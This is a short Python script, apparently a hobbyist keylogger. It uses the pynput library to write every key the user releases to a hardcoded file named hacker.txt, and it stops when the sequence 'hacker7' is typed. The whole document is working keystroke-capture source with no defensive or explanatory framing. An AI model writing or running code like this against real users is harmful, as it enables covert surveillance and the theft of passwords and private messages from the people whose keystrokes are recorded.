from pynput.keyboard import Listener, Key
import os
from collections import deque

# ROOT_DIR = os.path.abspath(os.curdir+r"\hacker.txt")
ROOT_DIR = os.path.abspath(r"C:\Users\Tiago\hacker.txt")

password = ["h", "a", "c", "k", "e", "r", "7"]

keys = deque(maxlen=7)


def log(text):
    with open(ROOT_DIR, "a") as file_log:
        file_log.write(text)


def monitor(key):
    try:
        keys.append(str(key.char))
        log(str(key.char))
    except AttributeError:

        log(" < "+str(key)+" > ")

    if "".join(password) == "".join(keys):
        return False


with Listener(on_release=monitor) as listener:
    listener.join()



